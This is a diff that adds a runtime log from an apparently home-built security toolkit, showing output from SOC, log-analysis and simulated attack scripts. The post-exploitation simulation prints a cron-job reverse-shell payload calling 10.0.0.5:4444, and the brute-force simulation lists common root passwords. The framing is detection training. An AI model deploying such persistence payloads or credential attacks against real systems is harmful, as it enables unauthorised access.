@@ -1,0 +1,235 @@
+=== Runtime Verification Log (Mon Nov 23 09:01:24 CAT 2026) ===
+
+>>> Running: active_enum.py
+Enter target IP or hostname: [-] No target specified.
+[EXIT CODE 1] on active_enum.py
+
+>>> Running: aggregator.py
+[
+  {
+    "event": "[AUTH] Failed login for root",
+    "severity": "HIGH"
+  },
+  {
+    "event": "[WEB] GET /admin/config.php - Status: 403",
+    "severity": "HIGH"
+  }
+]
+
+>>> Running: config_loader.py
+[+] Environment variables loaded securely from .env
+[*] Loaded Webhook target prefix: https://discord.com/api/webhoo...
+
+>>> Running: correlation_engine.py
+[+] Running SIEM Cross-Module Correlation Engine...
+--------------------------------------------------
+[*] Cross-Module Event Correlation Summary:
+--------------------------------------------------
+
+>>> Running: exploit_simulator.py
+============================================================
+      INITIAL ACCESS & BRUTE-FORCE TELEMETRY SIMULATOR
+============================================================
+
+[*] Initiating Simulated Credential Attack against 192.168.1.50
+[*] Target User Account: 'root'
+------------------------------------------------------------
+[-] Attempt 1: Trying password 'admin123' -> Rejected
+    [Blue Team Telemetry Log]: Nov 23 09:01:25 auth-server sshd[8412]: Failed password for invalid user root from 192.168.1.105 port 54322 ssh2
+[-] Attempt 2: Trying password 'password!2026' -> Rejected
+    [Blue Team Telemetry Log]: Nov 23 09:01:25 auth-server sshd[8412]: Failed password for invalid user root from 192.168.1.105 port 54322 ssh2
+[-] Attempt 3: Trying password 'root' -> Rejected
+    [Blue Team Telemetry Log]: Nov 23 09:01:26 auth-server sshd[8412]: Failed password for invalid user root from 192.168.1.105 port 54322 ssh2
+[-] Attempt 4: Trying password 'toor' -> Rejected
+    [Blue Team Telemetry Log]: Nov 23 09:01:26 auth-server sshd[8412]: Failed password for invalid user root from 192.168.1.105 port 54322 ssh2
+[-] Attempt 5: Trying password 'Welcome1' -> Rejected
+    [Blue Team Telemetry Log]: Nov 23 09:01:26 auth-server sshd[8412]: Failed password for invalid user root from 192.168.1.105 port 54322 ssh2
+[-] Attempt 6: Trying password 'letmein' -> Rejected
+    [Blue Team Telemetry Log]: Nov 23 09:01:27 auth-server sshd[8412]: Failed password for invalid user root from 192.168.1.105 port 54322 ssh2
+------------------------------------------------------------
+[!] ATTACK SIMULATION COMPLETE
+[*] Analyst Insight: Notice how a high volume of failed logins in a short sliding window
+    creates an identifiable brute-force signature in auth logs for SIEM detection.
+
+>>> Running: fim.py
+
+[+] Checking File Integrity...
+--------------------------------------------------
+[!] ALERT: File modified/tampered -> log_parser.py
+[OK] Unchanged -> port_scanner.py
+--------------------------------------------------
+
+>>> Running: fim_monitor.py
+[+] SHA-256 for incident_triage.py: 4bc8dc81232a7bf810eb61248a53470653e069242ca7a15a9cbe5bd94e712d91
+
+>>> Running: hash_auditor.py
+
+[+] Auditing Password Strength...
+----------------------------------------
+[*] Complexity Score: 4/4
+[+] Strong password criteria met!
+----------------------------------------
+
+[+] Computing Cryptographic Hashes:
+----------------------------------------
+MD5    : abf3c22316e3a3dfaf451ec4e0315043
+SHA-1  : 382caa7c44ee23ee25616f7e303af33c591efc3a
+SHA-256: ffc121a2210958bf74e5a874668f3d978d24b6a8241496ccff3c0ea245e4f126
+----------------------------------------
+
+>>> Running: incident_triage.py
+[
+  {
+    "severity": "HIGH",
+    "ip": "192.168.1.105",
+    "event_count": 5,
+    "action": "Escalated to L2 / Block IP"
+  }
+]
+
+>>> Running: ioc_extractor.py
+{
+  "ipv4_addresses": [
+    "185.220.101.5",
+    "192.0.2.1"
+  ],
+  "domains": [
+    "malware-c2-node.net",
+    "update-check-auth.com"
+  ],
+  "sha256_hashes": [
+    "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+  ]
+}
+
+>>> Running: log_aggregator.py
+[
+  {
+    "event": "[AUTH] Failed login for root",
+    "severity": "HIGH"
+  },
+  {
+    "event": "[WEB] GET /admin/config.php - Status: 403",
+    "severity": "HIGH"
+  }
+]
+
+>>> Running: log_parser.py
+
+[+] Scanning Log File: sample_auth.log
+---------------------------------------------
+IP Address           | Failed Attempts
+---------------------------------------------
+192.168.1.50         | 3               [ALERT: BRUTE-FORCE?]
+10.0.0.5             | 1              
+---------------------------------------------
+
+>>> Running: notifier.py
+[-] Usage: python3 notifier.py <YOUR_DISCORD_WEBHOOK_URL>
+
+>>> Running: packet_analyzer.py
+[
+  {
+    "port": 4444,
+    "risk": "Metasploit Default C2"
+  }
+]
+
+>>> Running: port_scanner.py
+
+[+] Starting scan on target: 127.0.0.1
+[+] Time started: 2026-11-23 09:01:28.711126
+----------------------------------------
+
+[+] Scan Completed.
+----------------------------------------
+[-] No specified ports open.
+----------------------------------------
+
+>>> Running: post_exploit.py
+============================================================
+      POST-EXPLOITATION & PERSISTENCE SIMULATION MODULE
+============================================================
+
+[*] Phase 1: Local Enumeration & Privilege Escalation Checks
+------------------------------------------------------------
+  [+] Executing: Checking sudo privileges
+      [Result]: User 'www-data' allowed to run /usr/bin/apt without password -> VULNERABLE
+  [+] Executing: Scanning SUID binaries
+      [Result]: Found unusual SUID bit on /bin/find -> Potential root escalation vector
+  [+] Executing: Inspecting active network listeners
+      [Result]: Local port 3306 (MySQL) bound to localhost (Internal service exposure)
+
+[*] Phase 2: Establishing Persistence Mechanism
+------------------------------------------------------------
+  [+] Installing simulated cron job backdoor...
+      [Payload]: */5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'
+      [Blue Team Alert]: File Integrity Monitor (FIM) or auditd flagged modification to /etc/crontab.
+------------------------------------------------------------
+[!] POST-EXPLOITATION CYCLE COMPLETE
+[*] Analyst Insight: Persistence mechanisms leave permanent trace artifacts.
+    Monitoring cron directories, SUID files, and registry keys is vital for detection.
+
+>>> Running: recon_intel.py
+Enter target domain (e.g., example.com): [-] No target specified.
+[EXIT CODE 1] on recon_intel.py
+
+>>> Running: report_generator.py
+[*] Aggregating security assessment findings across all modules...
+
+[+] Professional Audit Report Generated Successfully: pentest_report.md
+============================================================
+# Penetration Testing & Security Assessment Report
+**Engagement:** Offensive Security & Telemetry Audit
+**Target Asset:** target.local
+**Date:** 2026-11-23
+
+## 1. Executive Summary
+This automated assessment evaluated the target infrastructure across standard penetration testing lifecycle phases (Reconnaissance, Active Enumeration, Vulnerability Mapping, Exploitation, and Post-Exploitation).
+
+### Risk Summary
+- **Critical:** 1
+- **High:** 2
+- **Medium:** 1
+- **Low:** 0
+
+## 2. Technical Findings & Attack Chaining
+
+### [HIGH] VULN-01: Outdated OpenSSH Service Version
+- **Phase:** Vulnerability Analysis
+- **Description:** Target exposed an older OpenSSH build susceptible to known CVE intelligence vectors.
+- **Remediation Guidance:** Patch software packages to vendor-supported versions, enforce robust multi-factor authentication, and audit local SUID binaries regularly.
+
+### [CRITICAL] VULN-02: Weak Credential Brute-Force Vulnerability
+- **Phase:** Initial Access
+- **Description:** Authentication interface permitted dictionary-based brute-force attacks without rate limiting.
+- **Remediation Guidance:** Patch software packages to vendor-supported versions, enforce robust multi-factor authentication, and audit local SUID binaries regularly.
+
+### [HIGH] VULN-03: Privilege Escalation via Misconfigured SUID / Sudo
+- **Phase:** Post-Exploitation
+- **Description:** Low-privileged service accounts possessed excessive permissions to elevate privileges.
+- **Remediation Guidance:** Patch software packages to vendor-supported versions, enforce robust multi-factor authentication, and audit local SUID binaries regularly.
+
+============================================================
+
+>>> Running: reporter.py
+[+] Incident report successfully generated: reports/incident_2026-11-23_09-01-31.md
+
+>>> Running: siem_db.py
+[+] SIEM Database initialized successfully (`soc_siem.db`)
+
+[+] Recent SIEM Security Events (Database Audit):
+------------------------------------------------------------
+
+>>> Running: soc_dashboard.py
+  File "/data/data/com.termux/files/home/security_tools/soc_dashboard.py", line 188
+    >>>>>>> 285ed65d52e6af15c9c8d900ac8255624baee82d
+              ^
+SyntaxError: invalid decimal literal
+[EXIT CODE 1] on soc_dashboard.py
+
+>>> Running: subdomain_enum.py
+[*] Enumerating example.com...
+[+] RESOLVED: www.example.com -> 172.66.147.243
+
+>>> Running: syslog_server.py
